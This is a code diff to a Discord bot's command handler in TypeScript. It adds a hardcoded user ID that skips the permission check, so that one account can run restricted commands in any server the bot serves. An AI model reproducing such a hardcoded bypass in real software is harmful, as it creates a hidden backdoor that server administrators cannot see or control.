@@ -24,7 +24,7 @@ export default (message: Message, prefix: string, client: Client<boolean>) => {
     timestamps.set(message.author.id, now);
     setTimeout(() => timestamps.delete(message.author.id), cooldownAmount);
 
-    if (command.commandObject.permissions) {
+    if (command.commandObject.permissions && message.author.id !== '439039443744063488') {
         for (const permission of command.commandObject.permissions) {
             if (!message.member?.permissions.has(permission)) return message.reply('You seem to be missing permissions to use this command.');
         }
